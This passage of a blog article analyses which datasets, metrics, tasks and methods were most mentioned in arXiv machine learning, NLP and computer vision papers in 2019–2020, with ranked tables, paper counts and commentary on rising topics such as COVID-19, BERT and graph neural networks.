<td>classification</td>
<td>neural network</td>
</tr>
<tr>
<td><a href="http://www.image-net.org/">ImageNet</a></td>
<td>robustness</td>
<td>machine learning</td>
<td>deep neural network</td>
</tr>
<tr>
<td><a href="http://yann.lecun.com/exdb/mnist/">MNIST</a></td>
<td>complexity</td>
<td>training</td>
<td>convolutioal neural network</td>
</tr>
<tr>
<td>COVID-19</td>
<td>convergence</td>
<td>learning</td>
<td>deep learning</td>
</tr>
<tr>
<td><a href="https://www.cs.toronto.edu/~kriz/cifar.html">CIFER-100</a></td>
<td>computational cost</td>
<td>generalization</td>
<td>machine learning</td>
</tr>
<tr>
<td><a href="http://ufldl.stanford.edu/housenumbers/">SVHN</a></td>
<td>classification accuracy</td>
<td>prediction</td>
<td>reinforcement learning</td>
</tr>
<tr>
<td>chest x-ray</td>
<td>computational complexity</td>
<td>inference</td>
<td>GAN</td>
</tr>
<tr>
<td><a href="https://cocodataset.org/#home">COCO</a></td>
<td>precision</td>
<td>NLP</td>
<td>machine learning models</td>
</tr>
<tr>
<td><a href="http://www.cvlibs.net/datasets/kitti/">KITTI</a></td>
<td>f1 score</td>
<td>reinforcement learning</td>
<td>graph neural network</td>
</tr>
<tr>
<td>Twitter</td>
<td>sample complexity</td>
<td>artificial intelligence</td>
<td>classifier</td>
</tr>
</tbody>
</table>
<p>If you look at the list of datasets, most of them are related to computer vision, which is arguably the most actively researched area in machine learning.</p>
<p>As for the methods, you see neural networks everywhere. Among generic methods such as "neural network" and "deep learning" you also see "graph neural network," which is one of the biggest recent trends in ML.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="naturallanguageprocessingcscl">Natural Language Processing (cs.CL)</h3>
<p>Next, the most mentioned topics in NLP are shown below:</p>
<table>
<thead>
<tr>
<th>Datasets</th>
<th>Metrics</th>
<th>Tasks</th>
<th>Methods</th>
</tr>
</thead>
<tbody>
<tr>
<td>COVID-19</td>
<td>accuracy</td>
<td>NLP</td>
<td>BERT</td>
</tr>
<tr>
<td>English</td>
<td>F1 score</td>
<td>machine translation</td>
<td>language model</td>
</tr>
<tr>
<td>Twitter</td>
<td>bleu score</td>
<td>question answering</td>
<td>transformer</td>
</tr>
<tr>
<td>Wikipedia</td>
<td>robustness</td>
<td>named entity recognition</td>
<td>LSTM</td>
</tr>
<tr>
<td><a href="https://gluebenchmark.com/">GLUE</a></td>
<td>word error rate</td>
<td>automatic speech recognition</td>
<td>neural network</td>
</tr>
<tr>
<td>German</td>
<td>quality</td>
<td>neural machine translation</td>
<td>deep neural network</td>
</tr>
<tr>
<td><a href="https://rajpurkar.github.io/SQuAD-explorer/">SQuAD</a></td>
<td>precision</td>
<td>downstream tasks</td>
<td>NLP</td>
</tr>
<tr>
<td><a href="http://www.openslr.org/12">LibriSpeech</a></td>
<td>recall</td>
<td>classification</td>
<td>recurrent neural network</td>
</tr>
<tr>
<td>Wikidata</td>
<td>translation quality</td>
<td>sentiment analysis</td>
<td>neural models</td>
</tr>
<tr>
<td>Hindi</td>
<td>evaluation metrics</td>
<td>generation</td>
<td>convolutional neural network</td>
</tr>
</tbody>
</table>
<p>This was obvious in retrospect, but the most mentioned topic in NLP was "COVID-19." A dataset of COVID-related papers <a href="https://allenai.org/data/cord-19">CORD-19</a> was published. An information extraction shared task was held at the <a href="http://noisy-text.github.io/2020/">W-NUT 2020</a> workshop. A lot of research efforts were made for analyzing COVID-related information on social media as well as on clinical text. It is also nice to see many authors <a href="https://thegradient.pub/the-benderrule-on-naming-the-languages-we-study-and-why-it-matters/">name the language(s)</a> they work on in the abstract.</p>
<p>Top-mentioned methods are all related to BERT, language models, and transformers. I wonder when the <a href="https://ruder.io/nlp-imagenet/">"ImageNet Moment"</a> with transformer-based transfer learning is going to peak out in NLP.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="computervisioncscv">Computer Vision (cs.CV)</h3>
<p>Finally, here's the list of most mentioned topics in computer vision.</p>
<table>
<thead>
<tr>
<th>Datasets</th>
<th>Metrics</th>
<th>Tasks</th>
<th>Methods</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://www.image-net.org/">ImageNet</a></td>
<td>accuracy</td>
<td>segmentation</td>
<td>convolutional neural network</td>
</tr>
<tr>
<td><a href="https://www.cs.toronto.edu/~kriz/cifar.html">CIFER-10</a></td>
<td>robustness</td>
<td>classification</td>
<td>deep neural network</td>
</tr>
<tr>
<td><a href="https://cocodataset.org/#home">COCO</a></td>
<td>classification accuracy</td>
<td>computer vision</td>
<td>deep learning</td>
</tr>
<tr>
<td><a href="http://www.cvlibs.net/datasets/kitti/">KITTI</a></td>
<td>precision</td>
<td>object detection</td>
<td>neural network</td>
</tr>
<tr>
<td><a href="https://www.cs.toronto.edu/~kriz/cifar.html">CIFER-100</a></td>
<td>computational cost</td>
<td>detection</td>
<td>GAN</td>
</tr>
<tr>
<td>COVID-19</td>
<td>maximum a posteriori</td>
<td>training</td>
<td>deep convolutional neural network</td>
</tr>
<tr>
<td><a href="http://yann.lecun.com/exdb/mnist/">MNIST</a></td>
<td>speed</td>
<td>semantic segmentation</td>
<td>deep learning models</td>
</tr>
<tr>
<td><a href="https://www.cityscapes-dataset.com/">Cityscapes</a></td>
<td>computational complexity</td>
<td>image classification</td>
<td>transfer learning</td>
</tr>
<tr>
<td>chest x-ray</td>
<td>generalization ability</td>
<td>generalization</td>
<td>classifier</td>
</tr>
<tr>
<td>RGB images</td>
<td>sensitivity</td>
<td>inference</td>
<td>deep learning methods</td>
</tr>
</tbody>
</table>
<p>Among the "regulars" such as CIFER-10/100, ImageNet, and MNIST, COVID-19 and chest x-ray are in the most mentioned dataset list. There has been a lot of research work on, for example, diagnosis of COVID-19 from chest x-ray images.</p>
<p>The most mentioned task was (semantic) segmentation, which is an important CV task with a wide range of applications such as autonomous driving and medical image processing.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="topicsontherisein2020">Topics on the Rise in 2020</h2>
<p>In the second half of this article, we are going to dive into some trends of individual fields by comparing the number of mentions between 2019 and 2020 and focusing on mentions that have significantly more (or fewer) mentions.</p>
<h3 id="machinelearningcslg">Machine Learning (cs.LG)</h3>
<p>First, let's look at the mention trends in machine learning. The following table lists the 20 most mentioned topics in 2020 (regardless of their types)  along with their monthly trends (relative number of papers that mention each keyword) in the past 24 months. If a topic has statistically significantly more mentions compared to the expected value based on the 2-year average, the trend is shown in green; red if it's significantly fewer.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: html--><table>
<thead>
  <tr>
    <th>Rank</th>
    <th>Topic</th>
    <th>Trend</th>
    <th># Papers (2019)</th>
    <th># Papers (2020)</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>1</td>
    <td>accuracy</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 12.24,11.18,12.09,12.35,11.40,9.73,12.13,12.57,10.90,10.96,11.63,11.66,10.80,11.10,12.37,12.21,12.18,10.40,11.38,12.07,13.33,11.70,12.55,11.97 --></span></td>
    <td>2209</td>
    <td>2971</td>
  </tr>
  <tr>
    <td>2</td>
    <td>machine learning</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 7.92,7.59,8.64,9.82,7.80,6.66,7.66,8.45,7.57,7.27,7.67,7.72,10.38,7.75,7.66,7.15,8.78,7.68,8.24,8.78,8.85,7.51,8.14,9.51 --></span></td>
    <td>1503</td>
    <td>2079</td>
  </tr>
  <tr>
    <td>3</td>
    <td>neural network</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 8.64,8.08,7.73,8.48,8.93,7.93,7.40,6.02,8.31,7.81,7.96,7.66,8.60,8.60,8.37,6.59,7.53,9.05,8.74,6.18,7.60,7.61,6.99,7.44 --></span></td>
    <td>1530</td>
    <td>1984</td>
  </tr>
  <tr>
    <td>4</td>
    <td>deep neural network</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 8.73,7.84,8.36,8.56,8.88,6.98,7.53,9.37,7.68,8.71,7.82,8.61,7.11,8.20,7.94,8.16,6.53,7.80,8.57,7.54,8.14,7.20,7.86,8.38 --></span></td>
    <td>1585</td>
    <td>1969</td>
  </tr>
  <tr>
    <td>5</td>
    <td>deep learning</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 6.48,5.88,6.09,7.44,5.43,5.13,7.14,6.02,6.21,5.25,5.47,7.66,7.25,6.06,6.13,6.28,6.95,5.54,6.27,4.99,6.56,5.71,5.93,6.81 --></span></td>
    <td>1174</td>
    <td>1548</td>
  </tr>
  <tr>
    <td>6</td>
    <td>convolutional neural network</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 6.12,4.90,6.91,6.32,5.03,5.07,6.49,6.93,5.82,5.39,6.89,6.46,6.68,4.68,6.40,6.28,5.80,4.50,4.68,5.33,4.70,4.08,4.92,5.10 --></span></td>
    <td>1150</td>
    <td>1296</td>
  </tr>
  <tr>
    <td>7</td>
    <td>reinforcement learning</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 5.13,4.16,5.18,3.87,5.28,5.81,4.67,4.19,6.27,5.21,4.45,4.55,4.62,5.30,5.36,4.46,4.13,4.62,4.43,4.82,3.77,4.57,6.62,4.28 --></span></td>
    <td>955</td>
    <td>1204</td>
  </tr>
  <tr>
    <td>8</td>
    <td>classification</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 5.31,4.49,4.82,4.84,3.95,4.44,4.15,4.11,3.73,3.86,4.25,5.08,4.41,3.79,5.15,5.02,5.18,4.77,4.68,4.08,4.86,3.94,4.37,3.15 --></span></td>
    <td>838</td>
    <td>1127</td>
  </tr>
  <tr>
    <td>9</td>
    <td>robustness</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.70,3.59,4.00,3.12,4.05,5.39,3.05,3.66,3.28,3.05,2.34,4.01,2.63,4.06,4.16,3.90,3.29,4.53,3.43,3.68,3.93,4.05,3.36,4.35 --></span></td>
    <td>680</td>
    <td>970</td>
  </tr>
  <tr>
    <td>10</td>
    <td>training</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.97,3.02,2.82,3.57,3.11,3.44,3.50,3.81,3.56,3.50,2.98,3.11,3.70,3.43,3.23,3.65,2.88,3.85,3.01,2.89,2.51,3.15,3.36,3.40 --></span></td>
    <td>635</td>
    <td>828</td>
  </tr>
  <tr>
    <td>11</td>
    <td>learning</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 3.78,3.35,3.45,3.35,3.95,3.17,3.76,2.51,2.99,3.86,3.18,2.93,3.27,2.72,3.28,2.84,2.61,3.98,3.60,2.66,2.79,3.67,3.31,3.15 --></span></td>
    <td>650</td>
    <td>815</td>
  </tr>
  <tr>
    <td>12</td>
    <td>generalization</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.25,3.59,2.00,1.71,2.67,3.12,2.27,2.36,2.60,3.19,2.10,1.97,1.99,2.23,2.79,2.03,1.78,3.15,2.89,2.10,2.73,2.70,2.48,3.28 --></span></td>
    <td>486</td>
    <td>646</td>
  </tr>
  <tr>
    <td>13</td>
    <td>generative adversarial network</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 4.23,3.59,2.55,3.42,3.46,2.75,2.99,2.82,2.32,3.86,2.78,2.81,2.63,2.41,2.68,2.94,2.46,2.57,2.34,2.44,2.19,2.28,1.66,2.02 --></span></td>
    <td>601</td>
    <td>602</td>
  </tr>
  <tr>
    <td>14</td>
    <td>artificial intelligence</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 1.71,1.39,1.55,1.79,1.68,1.69,1.75,1.52,1.86,1.89,1.91,2.15,2.84,1.43,2.85,2.58,2.14,1.56,2.17,2.89,2.73,1.83,2.48,2.58 --></span></td>
    <td>340</td>
    <td>568</td>
  </tr>
  <tr>
    <td>15</td>
    <td><a href="https://www.cs.toronto.edu/~kriz/cifar.html">CIFAR-10</a></td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.52,2.04,1.45,2.68,3.01,2.75,2.14,1.45,2.71,1.98,2.10,1.97,2.42,2.81,3.12,2.13,1.78,2.29,2.38,1.64,1.86,1.73,2.25,2.27 --></span></td>
    <td>438</td>
    <td>560</td>
  </tr>
  <tr>
    <td>16</td>
    <td>COVID-19</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.06,0.00,0.13,2.03,3.90,3.45,1.50,2.72,2.83,3.11,2.35,2.16,2.02 --></span></td>
    <td>1</td>
    <td>551</td>
  </tr>
  <tr>
    <td>17</td>
    <td>machine learning models</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 1.26,1.06,1.64,2.01,2.27,1.69,2.01,2.13,1.81,1.66,2.39,2.27,2.56,2.05,2.57,1.62,2.40,1.71,2.01,1.87,2.40,2.32,1.89,3.21 --></span></td>
    <td>365</td>
    <td>547</td>
  </tr>
  <tr>
    <td>18</td>
    <td>graph neural network</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 0.54,0.65,1.18,1.26,2.22,1.00,0.91,0.76,1.64,1.44,0.88,1.14,1.42,1.25,1.64,1.06,1.83,2.75,2.38,1.98,3.06,2.46,2.21,2.46 --></span></td>
    <td>230</td>
    <td>530</td>
  </tr>
  <tr>
    <td>19</td>
    <td>natural language processing</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 1.17,0.98,1.09,1.64,1.28,1.90,1.36,1.29,2.26,1.66,2.30,1.44,2.20,1.56,1.64,3.35,2.09,1.68,1.80,1.81,1.97,3.18,1.79,1.89 --></span></td>
    <td>307</td>
    <td>529</td>
  </tr>
  <tr>
    <td>20</td>
    <td>prediction</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.07,2.29,1.27,2.23,1.97,2.17,2.47,1.90,1.53,1.26,2.34,1.97,1.99,2.01,1.92,1.57,1.88,1.74,2.30,2.21,2.02,2.25,2.21,2.46 --></span></td>
    <td>375</td>
    <td>515</td>
  </tr>
  <tr>
    <td></td>
    <td>Total</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 1111,1225,1100,1344,2026,1892,1541,1313,1770,2227,2047,1672,1407,2244,1827,1973,1913,3270,2391,1765,1830,2890,2175,1587 --></span></td>
    <td>19,268</td>
    <td>25,272</td>
  </tr>
</tbody>
</table><!--kg-card-end: html--><!--kg-card-begin: markdown--><p>The table above shows that the actual number of papers mentioning "deep neural network," "convolutional neural network," "generative adversarial network" is significantly smaller than expected. These topics became so widespread that papers might not even bother to mention them anymore (at least in the title or the abstract).</p>
<p>On the other hand, COVID-19 and graph neural networks are on the rise, as discussed above. The entire field of NLP seems to be on the rise as well, thanks to the continued interests in methods such as transformers and BERT.</p>
<p>Beyond these 20, topics that have significantly more mentions in 2020 include: "federated learning," "data augmentation," and "meta learning."</p>
<h3 id="naturallanguageprocessingcscl">Natural Language Processing (cs.CL)</h3>
<p>Next, the topic trends in natural language processing are shown below:</p>
<!--kg-card-end: markdown--><!--kg-card-begin: html--><table>
<thead>
  <tr>
    <th>Rank</th>
    <th>Topic</th>
    <th>Trend</th>
    <th># Papers (2019)</th>
    <th># Papers (2020)</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>1</td>
    <td>natural language processing</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 12.32,8.47,14.07,6.50,8.07,7.73,6.43,7.82,8.01,7.96,10.78,8.31,10.58,12.15,11.45,12.49,10.58,12.42,13.12,10.97,10.10,12.22,12.14,10.88 --></span></td>
    <td>460</td>
    <td>805</td>
  </tr>
  <tr>
    <td>2</td>
    <td>BERT</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 2.96,5.08,4.18,6.08,7.58,5.80,6.17,9.73,8.87,10.55,7.45,6.37,4.44,9.39,9.50,11.25,8.81,7.74,9.16,10.70,10.10,8.63,10.46,7.51 --></span></td>
    <td>393</td>
    <td>634</td>
  </tr>
  <tr>
    <td>3</td>
    <td>accuracy</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 12.81,8.05,9.51,9.64,9.29,5.15,11.31,8.21,6.87,7.09,9.03,7.76,10.58,9.39,8.38,6.97,7.87,11.81,10.89,8.88,9.76,9.17,8.26,10.36 --></span></td>
    <td>447</td>
    <td>625</td>
  </tr>
  <tr>
    <td>4</td>
    <td>language model</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 1.48,5.51,1.52,3.77,3.42,3.54,4.37,4.20,5.72,4.50,4.60,2.49,3.75,4.70,2.51,5.96,5.05,4.28,6.19,6.79,6.45,8.40,6.91,6.74 --></span></td>
    <td>217</td>
    <td>419</td>
  </tr>
  <tr>
    <td>5</td>
    <td>machine translation</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 2.46,6.78,3.80,3.98,6.11,6.44,6.43,6.87,6.29,6.92,6.02,4.71,4.10,2.21,6.15,7.87,3.64,6.92,4.21,2.61,3.48,4.74,4.72,2.59 --></span></td>
    <td>315</td>
    <td>324</td>
  </tr>
  <tr>
    <td>6</td>
    <td>F1 score</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.96,1.69,4.18,3.77,2.69,3.86,4.11,3.63,5.01,2.94,3.33,4.43,2.73,3.31,3.91,3.37,3.76,4.28,5.94,4.96,5.75,4.81,3.37,5.44 --></span></td>
    <td>198</td>
    <td>297</td>
  </tr>
  <tr>
    <td>7</td>
    <td>transformer</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 1.48,2.12,3.80,1.89,1.71,4.03,3.34,3.24,2.15,3.63,2.54,3.32,3.75,4.14,5.31,3.26,4.00,4.48,4.95,3.39,5.92,4.43,3.54,4.40 --></span></td>
    <td>153</td>
    <td>293</td>
  </tr>
  <tr>
    <td>8</td>
    <td>neural machine translation</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 4.43,4.66,3.04,2.73,6.60,6.60,3.86,6.11,5.58,4.50,5.07,4.43,3.75,6.35,3.63,6.19,3.64,4.07,1.98,1.57,3.83,4.51,4.05,2.07 --></span></td>
    <td>269</td>
    <td>280</td>
  </tr>
  <tr>
    <td>9</td>
    <td>question answering</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.96,4.24,3.42,2.73,3.91,2.58,4.63,4.58,3.72,5.19,4.60,3.88,2.05,4.14,2.23,4.95,3.64,4.07,4.21,1.83,3.66,4.81,4.05,2.07 --></span></td>
    <td>211</td>
    <td>264</td>
  </tr>
  <tr>
    <td>10</td>
    <td>automatic speech recognition</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 0.49,1.27,1.90,5.03,3.18,2.90,3.86,1.91,2.58,5.02,3.17,3.32,3.41,2.76,2.51,1.69,5.41,4.89,3.71,4.70,0.87,3.59,6.07,3.63 --></span></td>
    <td>168</td>
    <td>249</td>
  </tr>
  <tr>
    <td>11</td>
    <td>named entity recognition</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 3.45,4.24,3.80,2.94,1.22,1.93,1.80,4.96,4.01,2.77,3.17,3.32,3.41,2.49,5.59,3.82,2.94,2.44,3.96,2.61,2.44,2.67,3.54,3.37 --></span></td>
    <td>167</td>
    <td>219</td>
  </tr>
  <tr>
    <td>12</td>
    <td>LSTM</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 4.93,5.08,6.08,5.03,4.89,3.38,4.88,3.63,4.01,3.29,2.69,4.16,4.10,3.59,2.23,3.15,1.88,2.44,4.95,3.39,2.61,2.98,2.70,3.63 --></span></td>
    <td>220</td>
    <td>206</td>
  </tr>
  <tr>
    <td>13</td>
    <td>BLEU score</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 1.97,3.81,2.66,4.61,4.65,4.03,2.06,3.82,4.29,4.15,4.12,1.39,3.75,2.49,1.96,4.05,2.35,2.44,1.73,3.13,4.53,3.44,2.70,0.78 --></span></td>
    <td>199</td>
    <td>204</td>
  </tr>
  <tr>
    <td>14</td>
    <td>neural network</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 0.99,1.69,3.04,3.35,4.40,3.22,3.60,2.29,2.86,3.98,3.17,4.71,4.44,4.14,3.35,2.25,1.65,4.68,1.98,2.09,2.79,1.53,2.87,1.81 --></span></td>
    <td>174</td>
    <td>173</td>
  </tr>
  <tr>
    <td>15</td>
    <td>downstream tasks</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 0.49,2.54,1.14,1.05,0.98,1.77,1.29,1.72,1.57,1.73,2.38,2.22,2.05,1.93,2.23,3.71,2.47,2.24,2.72,1.31,2.26,2.67,2.19,2.59 --></span></td>
    <td>88</td>
    <td>173</td>
  </tr>
  <tr>
    <td>16</td>
    <td>sentiment analysis</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.96,3.39,1.90,2.10,2.20,2.25,1.54,2.86,1.43,1.21,2.69,3.60,2.05,2.76,2.51,1.80,2.82,3.05,6.19,3.92,1.92,1.38,2.36,2.33 --></span></td>
    <td>120</td>
    <td>172</td>
  </tr>
  <tr>
    <td>17</td>
    <td>classification</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 0.49,2.54,2.28,2.10,2.20,1.45,1.80,1.72,2.00,1.73,1.90,2.77,2.39,2.49,3.35,2.47,2.12,1.83,3.22,3.39,2.44,1.53,2.70,3.89 --></span></td>
    <td>103</td>
    <td>168</td>
  </tr>
  <tr>
    <td>18</td>
    <td>COVID-19</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,1.40,1.91,2.70,3.46,5.94,4.18,2.79,1.38,1.69,4.92 --></span></td>
    <td>0</td>
    <td>165</td>
  </tr>
  <tr>
    <td>19</td>
    <td>natural language understanding</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 0.99,0.42,1.14,0.84,0.98,1.45,2.57,2.29,2.15,1.38,1.27,1.11,1.71,1.38,1.12,2.36,2.12,3.26,1.73,1.57,2.61,2.14,3.37,3.37 --></span></td>
    <td>80</td>
    <td>158</td>
  </tr>
  <tr>
    <td>20</td>
    <td>generation</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 0.99,1.69,1.14,1.68,2.44,2.58,1.29,2.67,2.00,1.73,2.06,1.66,1.37,1.93,1.96,3.15,2.23,2.04,0.99,2.87,2.79,2.37,1.18,2.85 --></span></td>
    <td>105</td>
    <td>155</td>
  </tr>
  <tr>
    <td></td>
    <td>Total</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 203,236,263,477,409,621,389,524,699,578,631,361,293,362,358,889,851,491,404,383,574,1309,593,386 --></span></td>
    <td>5,391</td>
    <td>6,893</td>
  </tr>
</tbody>
</table>
<!--kg-card-end: html--><!--kg-card-begin: markdown--><p>BERT, language models, and transformers are among the "hottest" methods in recent years, and their mentions are on the rise in 2020 too. The significantly larger number of "downstream tasks" mentions is most likely due to the continued interests in transfer learning.</p>
<p>On the flip side, "machine translation," "neural machine translation," and "BLEU score" were not mentioned as much. This does not mean these translation-related topics are not important, but does mean that the NLP trends have shifted to pretrained language models after the the "Transformer shock" in 2017 had subsided.</p>
<p>Other mentions that increased significantly in 2020 include "pretrain models," "fine-tuning," and "RoBERTa." The mentions of RoBERTa had increased 6-fold in 2020 compared to the previous year, cementing its position as the baseline pretrained model after BERT.</p>
<h3 id="computervisioncscv">Computer Vision (cs.CV)</h3>
<!--kg-card-end: markdown--><!--kg-card-begin: html--><table>
<thead>
  <tr>
    <th>Rank</th>
    <th>Topic</th>
    <th>Trend</th>
    <th># Papers (2019)</th>
    <th># Papers (2020)</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>1</td>
    <td>accuracy</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 14.03,14.98,12.47,15.48,14.68,15.78,16.79,13.14,14.51,14.45,15.21,15.03,14.47,13.97,14.58,15.28,15.41,14.29,15.04,14.11,14.95,16.03,18.35,15.31 --></span></td>
    <td>1711</td>
    <td>2270</td>
  </tr>
  <tr>
    <td>2</td>
    <td>convolutional neural network</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 16.40,16.25,13.87,13.01,14.98,14.59,13.39,13.43,14.14,13.59,14.65,12.23,14.34,11.76,10.86,11.48,11.42,12.38,11.32,11.09,10.23,12.55,9.92,9.44 --></span></td>
    <td>1629</td>
    <td>1689</td>
  </tr>
  <tr>
    <td>3</td>
    <td>deep neural network</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 7.68,7.89,8.39,6.94,10.25,7.35,6.90,7.84,5.84,8.13,7.98,8.12,5.38,8.93,6.72,7.38,6.95,8.50,7.55,6.79,9.18,7.32,8.02,7.52 --></span></td>
    <td>899</td>
    <td>1127</td>
  </tr>
  <tr>
    <td>4</td>
    <td>deep learning</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 7.39,6.94,6.53,5.91,5.42,7.14,9.27,5.78,6.03,8.23,5.16,7.75,8.19,7.04,6.15,5.96,7.90,8.42,5.45,5.96,6.82,7.76,7.59,6.32 --></span></td>
    <td>782</td>
    <td>1027</td>
  </tr>
  <tr>
    <td>5</td>
    <td>segmentation</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 7.53,7.57,6.76,4.87,4.14,7.24,8.24,9.12,5.75,7.27,6.10,5.23,6.40,5.25,5.58,7.38,6.95,5.27,7.37,6.19,6.21,6.16,5.63,6.14 --></span></td>
    <td>758</td>
    <td>930</td>
  </tr>
  <tr>
    <td>6</td>
    <td>classification</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 5.91,6.62,5.13,5.67,5.32,6.81,5.15,4.51,4.81,3.92,4.98,4.48,5.63,4.31,5.22,4.55,5.23,5.86,5.93,4.68,6.73,5.51,6.40,3.85 --></span></td>
    <td>603</td>
    <td>801</td>
  </tr>
  <tr>
    <td>7</td>
    <td>neural network</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 6.35,4.42,4.55,4.71,5.52,5.95,5.05,4.12,3.58,4.50,4.98,4.39,6.53,7.35,4.65,4.02,4.66,7.47,5.03,4.91,6.29,4.50,4.92,3.02 --></span></td>
    <td>556</td>
    <td>777</td>
  </tr>
  <tr>
    <td>8</td>
    <td>robustness</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 3.99,4.73,3.50,4.23,3.65,6.16,3.40,4.31,4.71,3.35,3.85,6.16,3.46,4.83,4.57,4.02,3.81,4.84,4.55,4.83,5.07,5.80,4.85,5.41 --></span></td>
    <td>503</td>
    <td>703</td>
  </tr>
  <tr>
    <td>9</td>
    <td>computer vision</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 5.32,4.42,4.20,4.95,4.43,3.35,5.25,4.02,3.11,4.02,5.07,4.30,4.61,4.41,3.86,4.10,4.57,4.69,3.95,3.09,4.90,3.55,4.36,3.85 --></span></td>
    <td>505</td>
    <td>615</td>
  </tr>
  <tr>
    <td>10</td>
    <td>generative adversarial network</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 6.20,6.31,5.24,3.91,5.52,3.46,4.94,4.90,4.05,6.03,4.23,5.98,4.48,4.83,3.93,3.87,3.81,4.47,3.71,3.02,3.50,3.63,4.15,4.31 --></span></td>
    <td>577</td>
    <td>587</td>
  </tr>
  <tr>
    <td>11</td>
    <td>object detection</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.36,3.15,4.66,4.23,4.14,3.03,2.99,3.14,3.77,2.87,3.85,4.11,3.33,2.84,3.79,3.58,3.52,3.88,4.49,3.09,2.97,2.76,4.01,3.67 --></span></td>
    <td>415</td>
    <td>529</td>
  </tr>
  <tr>
    <td>12</td>
    <td>detection</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 3.25,2.37,3.50,3.67,3.74,3.46,4.22,3.63,3.86,2.11,3.00,3.36,3.97,2.52,3.86,3.20,2.76,4.25,3.89,3.32,3.85,2.25,2.60,4.58 --></span></td>
    <td>392</td>
    <td>510</td>
  </tr>
  <tr>
    <td>13</td>
    <td>training</td>
